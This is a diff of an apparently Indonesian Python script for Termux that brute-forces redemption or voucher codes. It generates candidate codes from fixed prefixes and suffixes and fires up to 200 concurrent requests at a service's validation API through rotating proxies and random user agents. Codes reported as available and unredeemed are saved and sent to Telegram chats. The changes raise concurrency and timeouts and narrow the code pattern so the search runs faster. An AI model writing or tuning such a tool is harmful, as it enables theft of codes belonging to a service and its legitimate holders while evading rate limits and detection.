@@ -4,10 +4,9 @@ import aiofiles
 import random
 import time
 import logging
-import json
 from datetime import datetime
 
-# Konfigurasi warna ANSI
+# Konfigurasi warna ANSI untuk output di Termux
 GREEN = "\033[92m"
 RED = "\033[91m"
 YELLOW = "\033[93m"
@@ -50,30 +49,25 @@ class CodeValidator:
     def __init__(self, device_id, total_devices):
         self.device_id = device_id
         self.total_devices = total_devices
-        self.sem = asyncio.Semaphore(150)
+        self.sem = asyncio.Semaphore(200)
         self.batch_size = 100
         self.retry_delay = 0.1
-        self.success_count = 0
-        self.start_time = time.time()
-        self.validated_codes = set()
-        self.prefixes = ["MF", "BY", "CW", "9L", "J8"]  # Prefix yang ditentukan
+        self.valid_codes = set()
+        self.prefixes = ["BY", "MF", "CW", "J8", "9L"]
+        self.suffixes = ["LH", "8D", "8M", "YX", "TK", "4Y", "9Y", "9X"]
         self.total_valid = 0
         self.total_invalid = 0
         self.total_error = 0
         self.total_processed = 0
 
     def generate_code(self):
-        """Generate kode dengan 2 prefiks awal yang ditentukan dan 6 karakter acak alfanumerik"""
+        """Generate kode dengan format [prefix][4 random alphanumeric][suffix]"""
         prefix = random.choice(self.prefixes)
-        suffix = random.choice(self.prefixes)
-        random_part = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=6))
-        return f"{prefix}{random_part}"
+        middle_part = ''.join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=4))
+        suffix = random.choice(self.suffixes)
+        return f"{prefix}{middle_part}{suffix}"
 
     async def validate_code(self, session, code):
-        if code in self.validated_codes:
-            return code, 400, "Already validated"
-        
-        self.validated_codes.add(code)
         async with self.sem:
             headers = {
                 'User-Agent': random.choice(USER_AGENTS),
@@ -105,7 +99,7 @@ class CodeValidator:
                         headers=headers,
                         proxy=proxy_url,
                         proxy_auth=proxy_auth,
-                        timeout=3
+                        timeout=10
                     ) as response:
                         if response.status == 200:
                             resp_json = await response.json()
@@ -114,9 +108,9 @@ class CodeValidator:
                                 resp_json.get("data", {}).get("is_avaliable") is True and
                                 resp_json.get("data", {}).get("is_redeem") is False
                             ):
+                                await self.record_valid_code(code)
                                 self.total_valid += 1
-                                await self.save_valid_code(code)
-                                print(f"{BRIGHT}{GREEN}**KODE VALID**:{RESET} {GREEN}{code}{RESET}")
+                                print(f"{BRIGHT}{GREEN}**KODE VALID**:{RESET}\n{GREEN}{code}{RESET}")
                                 return code, 200, "Code is available and not redeemed"
                             else:
                                 self.total_invalid += 1
@@ -132,34 +126,26 @@ class CodeValidator:
 
             return code, 500, "Failed after retries"
 
-    async def save_valid_code(self, code):
-        try:
-            async with aiofiles.open('valid_codes.txt', 'a') as f:
-                await f.write(f"{code}\n")
-            
-            for chat_id in CHAT_IDS:
-                message = f"{code}"
-                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                payload = {'chat_id': chat_id, 'text': message}
-                async with aiohttp.ClientSession() as session:
-                    await session.post(url, data=payload)
-            
-            self.success_count += 1
-            rate = self.success_count / ((time.time() - self.start_time) / 60)
-            logger.info(f"Device {self.device_id}: Success rate: {rate:.2f} codes/minute")
-            
-        except Exception as e:
-            logger.error(f"Error saving valid code: {e}")
+    async def record_valid_code(self, code):
+        """Simpan kode valid dan kirim notifikasi ke Telegram"""
+        async with aiofiles.open('valid_codes.txt', 'a') as f:
+            await f.write(f"{code}\n")
+        
+        for chat_id in CHAT_IDS:
+            message = f"{code}"
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {'chat_id': chat_id, 'text': message}
+            async with aiohttp.ClientSession() as session:
+                await session.post(url, data=payload)
 
     def display_status(self, elapsed_time):
         print(
-            f"\n{YELLOW}Device: {self.device_id}{RESET}\n"
+            f"{YELLOW}Device: {self.device_id}{RESET}\n"
             f"{BLUE}Total Validasi Kode: {self.total_processed}{RESET}\n"
             f"{GREEN}Total Kode Valid: {self.total_valid}{RESET}\n"
             f"{YELLOW}Total Kode Invalid: {self.total_invalid}{RESET}\n"
             f"{RED}Total Kode Error: {self.total_error}{RESET}\n"
-            f"{WHITE}Waktu Validasi: {elapsed_time:.2f} detik{RESET}\n",
-            end=''
+            f"{WHITE}Waktu Validasi: {elapsed_time:.2f} detik{RESET}\n"
         )
 
 async def main():
